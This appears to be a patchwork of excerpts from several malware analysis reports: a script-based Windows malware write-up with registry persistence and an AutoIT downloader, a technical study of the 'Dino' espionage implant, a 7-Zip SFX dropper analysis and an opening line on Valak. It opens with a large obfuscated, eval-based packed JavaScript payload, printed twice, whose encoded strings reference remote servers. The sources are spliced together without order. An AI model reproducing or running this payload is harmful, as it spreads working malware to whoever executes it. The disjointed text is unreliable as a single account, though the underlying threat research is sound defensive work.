\x7C \x7C \x7C \x7C\x31\x6A\x7C \x7C\x7C\x32\x6D\x7C\x7C\x31\x6B\x7C\x7C \x7C \x7C\x32\x7A\x7C \x7C \x7C \x7C \x7C \x7C\x7C \x7C \x7C \x7C\x31\x4A\x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C\x31\x4F\x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C\x32\x4A\x7C \x7C\x32\x4B\x7C \x7C \x7C \x7C \x7C\x32\x6C\x7C\x32\x6E\x7C\x32\x6B\x7C\x32\x6A\x7C\x31\x6C\x7C \x7C \x7C\x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x5C\x27\x2E\x31\x4E\x28\x5C\x27\x7C\x5C \x2C\x30\x2C\x7B\x7D \x7D\x3B\x27\x3B\x31\x6D \x3D \x7B \x3B\x7D \x7B \x6A \x2C\x61\x2C\x63\x2C\x6B\x2C\x65\x2C \x7B\x65\x3D\x31\x6A \x7B\x31\x6B \x2E \x7D\x3B \x5C\x27\x5C\x27\x2E \x2F\x5E\x2F\x2C \x7B\x31\x7A \x2D\x2D\x29\x7B\x64\x5B\x63\x2E \x5D\x3D\x6B\x5B\x63\x5D\x7C\x7C\x63\x2E \x7D\x6B\x3D\x5B\x31\x6A \x7B\x31\x6B \x5B\x65\x5D\x7D\x5D\x3B\x65\x3D\x31\x6A \x7B\x31\x6B\x5C\x27\x5C\x5C\x5C\x5C\x77\x2B\x5C\x27\x7D\x3B\x63\x3D\x31\x7D\x3B\x31\x7A \x2D\x2D\x29\x7B \x6B\x5B\x63\x5D\x29\x7B\x70\x3D\x70\x2E \x5C\x27\x5C\x5C\x5C\x5C\x62\x5C\x27\x2B \x2B\x5C\x27\x5C\x5C\x5C\x5C\x62\x5C\x27\x2C\x5C \x5C \x2C\x6B\x5B\x63\x5D\x29\x7D\x7D\x31\x6B \x7D\x28\x5C \x3D\x22\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x22\x3B \x2E \x2E \x2E \x2B\x30\x2B \x2B\x30\x2B \x2B\x30\x2B \x3B\x5C\x27\x2C \x2C \x2C\x5C \x7C\x31\x6C\x7C \x7C \x7C\x31\x6D\x7C \x7C \x7C \x7C \x7C \x7C \x7C\x31\x4D\x5C\x27\x2E\x31\x4E\x28\x5C\x27\x7C\x5C \x2C\x30\x2C\x7B\x7D \x7D\x3B\x27\x3B \x3D\x22\x5C\x5C\x22\x3B \x3D \x3B\x31\x6F\x3D\x31\x6C\x2E \x6C\x2E\x31\x4D \x3B\x31\x4C\x3D\x31\x6C\x2E \x5A\x2E \x3B \x3D\x31\x4C\x2E \x2E\x31\x4B\x22\x2C \x2C\x30\x2C \x3B \x3D \x2B \x3B \x3D \x2B \x2B \x2B \x2B \x2B \x2B \x3B\x31\x6F\x2E \x2C \x3B \x3D\x31\x6F\x2E \x3B\x31\x6F\x2E\x32\x4F\x3D \x3B \x3D \x2B \x2B \x2B \x3B \x3D \x2B \x2B \x2B \x2B \x4C\x22\x2B \x2B \x2B \x2B \x2B \x2B \x2B \x2B \x3B\x31\x6F\x2E \x2C \x3B\x31\x6E\x3D\x31\x6C\x2E \x4D\x2E\x32\x4E \x3B\x31\x6E\x2E \x3B\x31\x6E\x2E \x3D\x32\x3B\x31\x6E\x2E \x3D\x30\x3B\x31\x6E\x2E \x3B\x31\x6E\x2E \x2C \x3B\x31\x6E\x2E\x32\x5A \x3B\x31\x6F\x2E \x2B \x2B \x2C\x30\x2C \x3B \x3D\x31\x6C\x2E \x5A\x2E \x3B \x3D\x31\x6C\x2E \x3B \x2E \x3B","\x7C"," \x6C ","\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x6F \x7C \x6E \x6F\x6E\x7C \x6E\x7C \x7C \x7C \x6D\x7C \x6C\x6C\x4F\x62\x6A\x7C \x7C\x74\x6F \x6E\x67\x7C \x7C \x4F\x62\x6A \x7C \x7C \x6F\x6E\x61\x6D\x65\x7C \x7C \x7C \x6C \x7C \x6E\x67\x7C \x6C\x65\x7C\x6E \x7C \x7C \x7C\x6C\x6F \x4E\x61\x6D\x65\x7C \x7C\x6C\x6F \x7C\x53\x6F \x7C \x7C\x48\x4B \x7C\x6E \x7C\x6A\x73\x7C\x45\x6E\x63\x4F\x62\x6A\x7C \x6C\x6C\x7C \x6C \x7C \x7C \x6E\x74\x7C \x7C \x6E\x61\x6D\x65\x7C \x6C\x7C\x6C\x6F \x7C \x6E \x6F\x6E\x7C \x6E\x73\x7C \x6F\x6D \x6F \x7C \x7C \x6F\x4F\x62\x6A\x7C \x6E\x67\x7C \x6D \x7C \x7C \x6E\x64\x6F \x7C \x6E\x7C\x62\x6F\x74\x6E\x61\x6D\x65\x7C \x7C \x7C \x7C\x63\x6F\x64\x7C\x7C \x7C \x6F \x6F\x6E \x7C\x58\x6D\x6C \x4F\x62\x6A\x7C \x7C \x7C\x68\x6F \x7C\x53\x6C \x7C \x6F\x6E \x7C \x7C\x63\x6D\x64\x7C \x7C \x6E\x64\x7C \x7C \x6E\x74\x7C \x7C\x66\x6C\x6F\x6F\x72\x7C \x7C\x65\x6E\x7C\x6C\x65\x6E \x7C\x6B \x7C \x7C\x72\x6E\x64\x7C\x4D \x7C\x6D \x7C \x7C\x6D\x69\x6E\x7C \x7C \x7C\x66\x6F\x72\x7C\x6D \x7C \x6F \x7C \x7C \x7C \x6E \x7C \x4F\x62\x6A \x7C \x6E\x64\x6F\x6D\x7C \x6E \x7C\x4D \x6F\x73\x6F \x7C \x4F \x7C \x6D\x7C \x6E \x6F \x7C \x7C\x45\x6E\x63\x6F \x7C\x45\x6E\x63\x6F \x6C\x65\x7C \x6E \x6E \x6F\x6E\x6D\x65\x6E \x6E \x7C\x4F \x6E\x7C \x7C \x6C \x6D\x4F\x62\x6A \x7C \x6C\x6C\x4E\x61\x6D\x65\x7C\x4D\x6F\x7A\x69\x6C\x6C\x61\x7C \x6C \x7C\x43\x6C\x6F \x7C\x50\x6F \x6F\x6E\x7C \x7C \x6F \x6C\x65\x7C \x7C \x6E \x6F\x6E\x7C\x7C\x7C\x4E\x54\x7C \x7C \x6C \x6C\x65\x7C \x7C \x7C\x6F \x6E\x7C\x63\x6F\x6D \x6C\x65\x7C\x4D ",""," \x6F\x6D \x6F "," \x6C ","\x5C\x77\x2B","\x5C\x62","\x67"];try{s()}catch(s){eval(function(_0xcddfx1,_0xcddfx2,_0xcddfx3,_0xcddfx4,_0xcddfx5,_0xcddfx6){_0xcddfx5= function(_0xcddfx3){return (_0xcddfx3< _0xcddfx2?_0xd766[4]:_0xcddfx5(parseInt(_0xcddfx3/ _0xcddfx2)))+ ((_0xcddfx3= _0xcddfx3% _0xcddfx2)> 35?String[_0xd766[5]](_0xcddfx3+ 29):_0xcddfx3.toString(36))};if(!_0xd766[4][_0xd766[6]](/^/,String)){while(_0xcddfx3--){_0xcddfx6[_0xcddfx5(_0xcddfx3)]= _0xcddfx4[_0xcddfx3]|| _0xcddfx5(_0xcddfx3)};_0xcddfx4= [function(_0xcddfx5){return _0xcddfx6[_0xcddfx5]}];_0xcddfx5= function(){return _0xd766[7]};_0xcddfx3= 1};while(_0xcddfx3--){if(_0xcddfx4[_0xcddfx3]){_0xcddfx1= _0xcddfx1[_0xd766[6]]( new RegExp(_0xd766[8]+ _0xcddfx5(_0xcddfx3)+ _0xd766[8],_0xd766[9]),_0xcddfx4[_0xcddfx3])}};return _0xcddfx1}(_0xd766[0],62,201,_0xd766[3][_0xd766[2]](_0xd766[1]),0,{}))}
0	var _0xd766=["\x31\x6D \x3D \x3B\x31\x6D \x3D \x3A\x2F\x2F \x2E \x2E\x31\x4A\x2F \x2F \x2F\x31\x4F\x22\x3B\x31\x6D \x3D \x2E\x31\x4B\x22\x3B\x31\x6D \x3D \x3B\x31\x6D \x3D \x7B \x3B\x7D \x7B \x6A \x2C\x61\x2C\x63\x2C\x6B\x2C\x65\x2C \x7B\x65\x3D\x31\x6A \x7B\x31\x6B \x3C\x61\x3F\x5C\x27\x5C\x27\x3A \x2F \x2B \x3D \x3E \x3F \x2E \x2B \x3A\x63\x2E \x7D\x3B \x5C\x27\x5C\x27\x2E \x2F\x5E\x2F\x2C \x7B\x31\x7A \x2D\x2D\x29\x7B\x64\x5B \x5D\x3D\x6B\x5B\x63\x5D\x7C\x7C \x7D\x6B\x3D\x5B\x31\x6A \x7B\x31\x6B \x5B\x65\x5D\x7D\x5D\x3B\x65\x3D\x31\x6A \x7B\x31\x6B\x5C\x27\x5C\x5C\x5C\x5C\x77\x2B\x5C\x27\x7D\x3B\x63\x3D\x31\x7D\x3B\x31\x7A \x2D\x2D\x29\x7B \x6B\x5B\x63\x5D\x29\x7B\x70\x3D\x70\x2E \x5C\x27\x5C\x5C\x5C\x5C\x62\x5C\x27\x2B \x2B\x5C\x27\x5C\x5C\x5C\x5C\x62\x5C\x27\x2C\x5C \x5C \x2C\x6B\x5B\x63\x5D\x29\x7D\x7D\x31\x6B \x7D\x28\x5C \x3D \x2C \x7B \x3D\x5C\x5C\x5C\x27\x5C\x5C\x5C\x27\x3B\x6B \x3D\x30\x3B\x69\x3C\x61\x2E\x7A\x3B\x69\x2B\x2B\x29\x7B\x39\x3D\x39\x2B\x47\x2E\x6E \x2E\x4A \x2E \x5E \x7D \x7D\x3B \x3D \x7B \x3D \x3B \x3D\x61\x2E \x2F\x2E\x7B\x31\x2C\x32\x7D\x2F \x7C\x7C\x5B\x5D\x3B\x6B \x3D\x30\x3B\x69\x3C\x64\x2E\x7A\x3B\x69\x2B\x2B\x29\x7B\x39\x2B\x3D\x47\x2E\x6E \x5B\x69\x5D\x2C \x7D\x3B \x7D\x3B \x3D \x6C\x2C \x7B \x2E \x2E \x2A \x2D\x6C\x2B \x2B\x6C\x7D\x3B \x3D \x2C\x4F\x29\x3B \x3D\x22\x6F\x3A\x2F\x2F\x6D\x2E\x77\x2E\x76\x2F\x6A\x2F\x46\x2F\x48\x2F\x6A\x2E\x49\x3F\x72\x3D\x22\x2B\x62\x2E\x4B \x3B \x3D \x3B\x6B\x28\x3B\x3B\x29\x7B\x4C\x7B\x38\x3D \x4E \x4D\x2E\x55\x2E\x35\x2E \x3B\x38\x2E \x2C\x66\x2C \x3B\x70\x3D \x2F\x34\x2E \x3B \x2E\x30\x3B \x2E \x3B\x75\x3D \x2D \x3B\x38\x2E \x2C \x3B\x38\x2E\x5A \x3B\x38\x2E \x3B \x2E\x58\x3D\x3D \x7B \x3D \x3D\x5C\x5C\x5C\x5C\x22\x6F\x3A\x2F\x2F\x6D\x2E\x77\x2E\x76\x2F\x6A\x2F\x46\x2F\x48\x2F \x2E\x49\x5C\x5C\x5C\x5C\x22\x3B \x3D\x5C\x5C\x5C\x5C \x5C\x5C\x5C\x5C\x22\x3B\x22\x2B \x2C \x2E \x3B \x7D\x7D \x7B\x7D\x3B \x2E \x7D\x3B\x5C\x27\x2C\x32\x6F\x2C \x2C\x5C\x27\x7C\x7C\x7C\x31\x6D\x7C\x7C\x7C\x7C\x7C \x7C \x7C \x7C \x7C\x31\x6A\x7C \x7C\x7C\x32\x6D\x7C\x7C\x31\x6B\x7C\x7C \x7C \x7C\x32\x7A\x7C \x7C \x7C \x7C \x7C \x7C\x7C \x7C \x7C \x7C\x31\x4A\x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C\x31\x4F\x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C\x32\x4A\x7C \x7C\x32\x4B\x7C \x7C \x7C \x7C \x7C\x32\x6C\x7C\x32\x6E\x7C\x32\x6B\x7C\x32\x6A\x7C\x31\x6C\x7C \x7C \x7C\x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x7C \x5C\x27\x2E\x31\x4E\x28\x5C\x27\x7C\x5C \x2C\x30\x2C\x7B\x7D \x7D\x3B\x27\x3B\x31\x6D \x3D \x7B \x3B\x7D \x7B \x6A \x2C\x61\x2C\x63\x2C\x6B\x2C\x65\x2C \x7B\x65\x3D\x31\x6A \x7B\x31\x6B \x2E \x7D\x3B \x5C\x27\x5C\x27\x2E \x2F\x5E\x2F\x2C \x7B\x31\x7A \x2D\x2D\x29\x7B\x64\x5B\x63\x2E \x5D\x3D\x6B\x5B\x63\x5D\x7C\x7C\x63\x2E \x7D\x6B\x3D\x5B\x31\x6A \x7B\x31\x6B \x5B\x65\x5D\x7D\x5D\x3B\x65\x3D\x31\x6A \x7B\x31\x6B\x5C\x27\x5C\x5C\x5C\x5C\x77\x2B\x5C\x27\x7D\x3B\x63\x3D\x31\x7D\x3B\x31\x7A \x2D\x2D\x29\x7B \x6B\x5B\x63\x5D\x29\x7B\x70\x3D\x70\x2E \x5C\x27\x5C\x5C\x5C\x5C\x62\x5C\x27\x2B \x2B\x5C\x27\x5C\x5C\x5C\x5C\x62\x5C\x27\x2C\x5C \x5C \x2C\x6B\x5B\x63\x5D\x29\x7D\x7D\x31\x6B \x7D\x28\x5C \x3D\x22\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x22\x3B \x2E \x2E \x2E \x2B\x30\x2B \x2B\x30\x2B \x2B\x30\x2B \x3B\x5C\x27\x2C \x2C \x2C\x5C \x7C\x31\x6C\x7C \x7C \x7C\x31\x6D\x7C \x7C \x7C \x7C \x7C \x7C \x7C\x31\x4D\x5C\x27\x2E\x31\x4E\x28\x5C\x27\x7C\x5C \x2C\x30\x2C\x7B\x7D \x7D\x3B\x27\x3B \x3D\x22\x5C\x5C\x22\x3B \x3D \x3B\x31\x6F\x3D\x31\x6C\x2E \x6C\x2E\x31\x4D \x3B\x31\x4C\x3D\x31\x6C\x2E \x5A\x2E \x3B \x3D\x31\x4C\x2E \x2E\x31\x4B\x22\x2C \x2C\x30\x2C \x3B \x3D \x2B \x3B \x3D \x2B \x2B \x2B \x2B \x2B \x2B \x3B\x31\x6F\x2E \x2C \x3B \x3D\x31\x6F\x2E \x3B\x31\x6F\x2E\x32\x4F\x3D \x3B \x3D \x2B \x2B \x2B \x3B \x3D \x2B \x2B \x2B \x2B \x4C\x22\x2B \x2B \x2B \x2B \x2B \x2B \x2B \x2B \x3B\x31\x6F\x2E \x2C \x3B\x31\x6E\x3D\x31\x6C\x2E \x4D\x2E\x32\x4E \x3B\x31\x6E\x2E \x3B\x31\x6E\x2E \x3D\x32\x3B\x31\x6E\x2E \x3D\x30\x3B\x31\x6E\x2E \x3B\x31\x6E\x2E \x2C \x3B\x31\x6E\x2E\x32\x5A \x3B\x31\x6F\x2E \x2B \x2B \x2C\x30\x2C \x3B \x3D\x31\x6C\x2E \x5A\x2E \x3B \x3D\x31\x6C\x2E \x3B \x2E \x3B","\x7C"," \x6C ","\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x6F \x7C \x6E \x6F\x6E\x7C \x6E\x7C \x7C \x7C \x6D\x7C \x6C\x6C\x4F\x62\x6A\x7C \x7C\x74\x6F \x6E\x67\x7C \x7C \x4F\x62\x6A \x7C \x7C \x6F\x6E\x61\x6D\x65\x7C \x7C \x7C \x6C \x7C \x6E\x67\x7C \x6C\x65\x7C\x6E \x7C \x7C \x7C\x6C\x6F \x4E\x61\x6D\x65\x7C \x7C\x6C\x6F \x7C\x53\x6F \x7C \x7C\x48\x4B \x7C\x6E \x7C\x6A\x73\x7C\x45\x6E\x63\x4F\x62\x6A\x7C \x6C\x6C\x7C \x6C \x7C \x7C \x6E\x74\x7C \x7C \x6E\x61\x6D\x65\x7C \x6C\x7C\x6C\x6F \x7C \x6E \x6F\x6E\x7C \x6E\x73\x7C \x6F\x6D \x6F \x7C \x7C \x6F\x4F\x62\x6A\x7C \x6E\x67\x7C \x6D \x7C \x7C \x6E\x64\x6F \x7C \x6E\x7C\x62\x6F\x74\x6E\x61\x6D\x65\x7C \x7C \x7C \x7C\x63\x6F\x64\x7C\x7C \x7C \x6F \x6F\x6E \x7C\x58\x6D\x6C \x4F\x62\x6A\x7C \x7C \x7C\x68\x6F \x7C\x53\x6C \x7C \x6F\x6E \x7C \x7C\x63\x6D\x64\x7C \x7C \x6E\x64\x7C \x7C \x6E\x74\x7C \x7C\x66\x6C\x6F\x6F\x72\x7C \x7C\x65\x6E\x7C\x6C\x65\x6E \x7C\x6B \x7C \x7C\x72\x6E\x64\x7C\x4D \x7C\x6D \x7C \x7C\x6D\x69\x6E\x7C \x7C \x7C\x66\x6F\x72\x7C\x6D \x7C \x6F \x7C \x7C \x7C \x6E \x7C \x4F\x62\x6A \x7C \x6E\x64\x6F\x6D\x7C \x6E \x7C\x4D \x6F\x73\x6F \x7C \x4F \x7C \x6D\x7C \x6E \x6F \x7C \x7C\x45\x6E\x63\x6F \x7C\x45\x6E\x63\x6F \x6C\x65\x7C \x6E \x6E \x6F\x6E\x6D\x65\x6E \x6E \x7C\x4F \x6E\x7C \x7C \x6C \x6D\x4F\x62\x6A \x7C \x6C\x6C\x4E\x61\x6D\x65\x7C\x4D\x6F\x7A\x69\x6C\x6C\x61\x7C \x6C \x7C\x43\x6C\x6F \x7C\x50\x6F \x6F\x6E\x7C \x7C \x6F \x6C\x65\x7C \x7C \x6E \x6F\x6E\x7C\x7C\x7C\x4E\x54\x7C \x7C \x6C \x6C\x65\x7C \x7C \x7C\x6F \x6E\x7C\x63\x6F\x6D \x6C\x65\x7C\x4D ",""," \x6F\x6D \x6F "," \x6C ","\x5C\x77\x2B","\x5C\x62","\x67"];try{s()}catch(s){eval(function(_0xcddfx1,_0xcddfx2,_0xcddfx3,_0xcddfx4,_0xcddfx5,_0xcddfx6){_0xcddfx5= function(_0xcddfx3){return (_0xcddfx3< _0xcddfx2?_0xd766[4]:_0xcddfx5(parseInt(_0xcddfx3/ _0xcddfx2)))+ ((_0xcddfx3= _0xcddfx3% _0xcddfx2)> 35?String[_0xd766[5]](_0xcddfx3+ 29):_0xcddfx3.toString(36))};if(!_0xd766[4][_0xd766[6]](/^/,String)){while(_0xcddfx3--){_0xcddfx6[_0xcddfx5(_0xcddfx3)]= _0xcddfx4[_0xcddfx3]|| _0xcddfx5(_0xcddfx3)};_0xcddfx4= [function(_0xcddfx5){return _0xcddfx6[_0xcddfx5]}];_0xcddfx5= function(){return _0xd766[7]};_0xcddfx3= 1};while(_0xcddfx3--){if(_0xcddfx4[_0xcddfx3]){_0xcddfx1= _0xcddfx1[_0xd766[6]]( new RegExp(_0xd766[8]+ _0xcddfx5(_0xcddfx3)+ _0xd766[8],_0xd766[9]),_0xcddfx4[_0xcddfx3])}};return _0xcddfx1}(_0xd766[0],62,201,_0xd766[3][_0xd766[2]](_0xd766[1]),0,{}))}
0	The variable is never used in the script, but it can give a hint of a network activity during the execution.
0	Now that we have a good overview of the malicious script code, let's enter into the details of its behavior with dynamic analysis.
0	Technique to Ensure Persistence
0	This folder is a hidden folder by default on Windows OS, so it is therefore harder for the target to detect the malicious file present in the system.
0	Now, when we take a look at the packed code in the registry key loaderName, we can notice the function(p,a,c,k,e,d) pattern in it (Figure 11).
0	This pattern is an indicator that the Dean Edwards packer was used to obfuscate the code.
0	This packer is outdated now but when it was common, it was widely used by benign scripts.
0	Because of this, it was whitelisted by many kinds of detection technologies.
0	An argument r, which is a random number shared between the malicious script and the remote server, is used like a token to encode and decode the data sent and received through the network.
0	Another function with the ability to decode strings is used here to decode the response of the GET request.
0	When we disassemble the Portable Executable (PE) file, we notice a clue that we are in the presence of a compiled AutoIT script.
0	Indeed, in the code there is a check to see if we are running the PE file with a debugger (Figure 16).
0	After the decompilation of the code (Figure 18) using an AutoIT script decompiler, we notice two parts in it.
0	The first part manages the retrieval of the system information.
0	This information is stored in the $asysinfo array.
0	Then there is a check on the sixth element of this array, which corresponds to the number of logical processors.
0	Using the InetGet and Run AutoIT functions, the malicious script downloads and executes multiple files on the target system.
0	The last file downloaded is stored in the Current User Startup folder, so this file will be executed each time the user logs in to the Windows OS.
0	After the analysis of the two samples, we have a good overview of how attackers use scripts to carry out their malicious activities on a target system.
0	In this section, we focus on the reasons that could lead an attacker to choose a script instead of a regular executable file.
0	First of all, scripting languages such as JScript, VBScript and even AutoIT were originally made to automate and simplify the execution of tasks in the Windows environment, and so these languages have multiple functions to ease the calls to Windows API.
0	Due to the ease of use of these functions, it is pretty simple for an attacker to establish a network connection or to interact with the Windows environment  for example, to execute shell commands.
0	Scripting languages are also often higher level than C or C++, and are easier to learn and more accessible for attackers.
0	With just a few lines of code, attackers can build a working and flexible malicious program with lots of features like network connection, persistence on the targeted system, execution of commands, etc.
0	Furthermore, attackers can use lots of different techniques and tools to obfuscate their malicious scripts.
0	This can involve very straightforward tools like Microsoft's script encoding, when the attacker is looking primarily for fast results, or it can take the form of very heavy obfuscations that will be challenging for analysts to deobfuscate.
0	This again illustrates the flexibility of scripts.
0	Finally, malicious scripts allow attackers to create heavy obfuscation if they choose to, meaning that the malicious scripts can evade different kinds of detections and so bypass anti-malware technologies.
0	Once the script-based malware is detected and tagged as malware by defenders, it is easier and faster for attackers to develop new variants to evade current detections if they are using scripting languages.
0	Indeed, customers are currently covered for the CVE-2019-0752 vulnerability by our IPS signature 55438.
0	URL Filtering and WildFire also protect our customers from the kinds of attacks described here.
0	Sign up to receive the latest news, cyber threat intelligence and research from us
0	Please enter your email address!
0	Please mark, I'm not a robot!
0	By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
0	The samples presented are two examples of how attackers can use scripts to engage in malicious activities on Windows target machines.
0	Those scripts do not reinvent the wheel, but they do offer flexibility and accessibility to attackers.
0	As we saw in our analyses, these advantages allow the attackers to execute commands and so potentially have full control over target machines.
0	Organizations with up-to-date Windows hosts that follow security best practices for secure web browsing have a much lower risk of infection.
0	Palo Alto Networks customers are further protected from this threat.
0	Dino  which could be referring to the pet character from The Flintstones cartoon show  was already mentioned in a recent Kaspersky blog as a full-featured espionage platform, but no technical analysis has been published yet.
0	More precisely, when a modification is made to a modules content in memory, the PSM module saves it as a serialized DataStore.
0	We can list the configurations content with Dinos conf l CORE command  described later  which displays on separate rows each keys name, its associated value and the type of this value:
0	Started:5523F782 QWORD
0	InitialWaitDone:00000001 DWORD
0	fields:78537844[REDACTED]66B3900 BYTES
0	BD_Keys: 4D41474943424F58[REDACTED]9EB3506 BYTES
0	CC_Keys: 4D41474943424F58[REDACTED]0000000 BYTES
0	ComServer3:hXXp://www.rsvniima.org/[REDACTED]/din12/postal.php STR
0	While most of the keys have self-explanatory names, we would like to focus on the following keys:
0	recID: Animal Farms binaries contain an ID whose decimal value appears to identify the target, 11173-01-PRS in this case.
0	For example Casper used an ID value set to 13001, whereas some Babar samples used 12075-01 and 11162-01.
0	We do not know the meaning of the PRS suffix added in the case of Dino.
0	ComServer: These keys contain the command and control (C&C) servers URLs.
0	For the record, a d13 folder has been seen on another Animal Farm C&C (see 3.7 Calling home of Marschaleks Babar report), indicating that Dino version 1.3 has also likely been deployed at some point.
0	Those C&Cs were compromised legitimate websites, which is standard operating procedure for Animal Farm.
0	Version: Dinos code version; here set to 1.2, which is confirmed by the din12 folder used in one of the C&C URLs.
0	After having described Dinos basics, we are now going to dig into two particularly interesting components; first, a custom file system used by the malware, and then the CRONTAB module in charge of task scheduling.
0	RamFS: A Temporary File System
0	Dino contains a custom file system named ramFS by its developers.
0	It provides a complex data structure to store files in memory, each of them bearing a name corresponding to filenames used by usual file systems.
0	RamFS also comes with a set of custom commands that can be stored in files and executed.
0	It should be noticed that ramFS is also present in other Animal Farm binaries (see attribution paragraph below), but since we are unaware of previous analysis of ramFS, we are describing our findings here.
0	Here are some high-level characteristics of this file system:
0	File names and file content are encoded in Unicode
0	File names length is limited to 260 characters
0	Once decrypted, file content is manipulated as chunks of 540 bytes
0	There is no metadata associated with the files
0	We could not find an existing file system matching the memory structures and the characteristics of ramFS, and therefore we believe this file system to be an original creation of the Animal Farm group.
0	Several commands can be executed in the context of ramFS, as listed in the following Table.
0	Hence, ramFS serves as a protected container for files to be executed on the machine, offering a disposable execution environment to the operators and leaving very few traces on the system.
0	The commands cronadd, cronlist and crondel serve respectively to add, list, and remove scheduled tasks registered in the CRONTAB module.
0	Those tasks are Dinos commands.
0	The syntax to define scheduled tasks is similar to the one used by the cron Unix command.
0	In particular the time at which to run a command is given by a string following the format minute hour day month year dayofweek.
0	Alternatively, this string can be replaced by @boot for a command to run at each startup  whereas some Unix cron implementations accept @reboot.
0	As an example, here is the output of the cronlist command after a wakeup command has been scheduled to run on 7th April 2015 at 15:44:
0	As we can see, each entry is identified by an Id, an incrementing hexadecimal number starting at 0xC0.
0	The purpose of the Local field remains unclear (the other possible value being -l).
0	The Count parameter counts the number of times a command has been executed, -1 indicating the command will be executed only once.
0	The amount of shared code between Dino and known Animal Farm malware leaves very little doubt that Dino belongs to Animal Farms arsenal.
0	Among these shared features, we can cite the following:
0	At the very beginning of Dino execution, the current process name is checked against process names used by some sandboxes:
0	To hide its calls to certain API functions, Dino employs a classic Animal Farm ploy: a hash is calculated from the functions name and used to look for the address of the API function.
0	The actual hashing algorithm used in Dino is the same that was used in Casper, namely a combination of rotate-left (ROL) of 7 bits and exclusive-or (XOR) operations.
0	The Dinos custom file system  the so-called ramFS  is present in several droppers used by Animal Farm.
0	In those binaries the file system serves to set the persistence of the payload.
0	For example, here is the command executed by some NBOT droppers in the context of ramFS:
0	As a final indication that Dino belongs to Animal Farm menagerie, it is noticeable that the output of Dinos sysinfo command looks like an updated version of the beacon from the SNOWBALL implant described in the leaked CSE slides  part of operation SNOWGLOBE, which led to the discovery of Babar:
0	Login/Domain (owner): Administrator/JOHN (john)
0	All these indicators together make us very confident that Dino was developed by the Animal Farm group.
0	Dino adds at least two more indicators to those already documented suggesting that Animal Farm developers are French speaking:
0	Dinos binary contains a resource whose language code value is 1036.
0	The original purpose of this language code is to allow developers to provide resources (menus, icons, version information) for different locations in the world in the corresponding language.
0	Interestingly, when a developer does not manually specify the language code, the compiler sets it to the language of the developers machine.
0	So, which language corresponds to the value 1036, or 0x40c in hexadecimal?
0	Of course a non-French speaking developer could have deliberately set this value to mislead attribution efforts.
0	But in more recent Animal Farm binaries (for example Casper), this language code has been set to the classical English (USA) language code.
0	Therefore, it seems that Animal Farm developers forgot to set this value in their first creations, realized their mistake at some point, and decided to set a standard value.
0	The GnuMP code in Dino contains file paths coming from the developers machine:
0	..\..\src\arithmetique\mpn\mul.c
0	..\..\src\arithmetique\printf\doprnt.c
0	As the attentive reader has probably guessed, arithmetique is the French translation of arithmetic.
0	But Dino also shows a poor knowledge, or interest, from these developers in anti-analysis techniques  contrary to what was seen in Casper  as demonstrated, for example, by the verbosity of some Dinos log messages:
0	These signs add to the pretty long list of indicators already supporting this hypothesis, in particular the ones mentioned by Canadas CSE.
0	Now, if we search for it using \x63\xB0\x55\x4E, we find this module for a Metasploit Framework:
0	Besides the date and time information, we also have a very generic username of the file creator: USER.
0	The shortcut has a hardcoded path to the icon, so the proper image will be shown only if the user has the browser installed on their computer.
0	Knowing the self-extracting archive compilation date allows us to find the WinRAR software version used by the attacker.
0	Moving on, to get the archive password we have to check the shortcut that is linked to it.
0	The file is a 7zip SFX archive that tries to look like a mysterious version of Email Microsoft Office Word software.
0	Although the last modification date is set to 10.04.2019 13:55:42 (GMT), the compilation timestamp is 05.03.2016 12:06:17 (GMT).
0	Unfortunately, none of the 7zip software release dates or versions corresponds to this timestamp, so our previous discovery technique did not work in this case.
0	This self-extracting archive contains two files and a script that is launched at extraction:
0	!@Install@!UTF-8!
0	RunProgram="hidcon:5493.cmd" (Run batch file with hidden console window after extraction)
0	SelfDelete="1" (Delete the archive after extraction)
0	To search for any hints of the software used to create this self-extracting archive, we looked into the file with just a text editor.
0	This time, searching for the copyright, versions, and script we found a custom tool called Modified 7-Zip SFX module for installers, version 1.6.1 Stable build 3873 was used to create the malicious file.
0	Looking into the batch file, we can see that it was not very obfuscated and therefore easy to read.
0	The first thing we can see is the configuration information.
0	Apparently, the attackers decided to not reinvent the wheel and simply used an open-source solution for exfiltrating the host data and downloading the main payload.
0	The shortcuts used in Windows are small files that simplify our lives by providing a fast way to access files, applications, and URLs.
0	If you switch your keyboard layout to Russian and type the password characters, you eventually recover an obscene phrase in Russian: **, that is translated as American b**tards.
0	So the rest of the string  fvthbrfycrbte,k.lrb is the password.
0	First noted in late 2019, Valak is an information stealer and malware loader that has become increasingly common in our threat landscape.
0	From April through June of 2020, we saw waves of Valak malware two to four times a week on average through an email distribution network nicknamed Shathak or TA551.
